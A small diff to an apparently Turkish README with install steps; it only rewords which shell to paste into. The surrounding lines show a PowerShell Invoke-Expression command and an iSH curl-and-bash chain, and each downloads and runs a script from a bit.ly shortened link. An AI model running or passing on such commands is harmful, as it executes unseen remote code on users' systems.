@@ -48,7 +48,7 @@ Genellikle tüm bilgisayarlarda default olarak kurulu.
 
 
 
-Ardından aşağıda belirtilen kodu termuxa yapıştırın.
+Ardından aşağıda belirtilen kodu powershell e yapıştırın.
 
 
 `Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/3SaBdI5")`
@@ -71,7 +71,7 @@ Kurmak için öncelikle İSH adlı uygulamayı indirelim.
 
 
 
-Ardından aşağıda belirtilen kodu termuxa yapıştırın.
+Ardından aşağıda belirtilen kodu ish ye yapıştırın.
 
 
 `apk update && apk add py3-pip && apk add bash && apk add curl && curl -L -o ios.sh https://bit.ly/3BNUlX9 && chmod +x ios.sh && bash ios.sh`
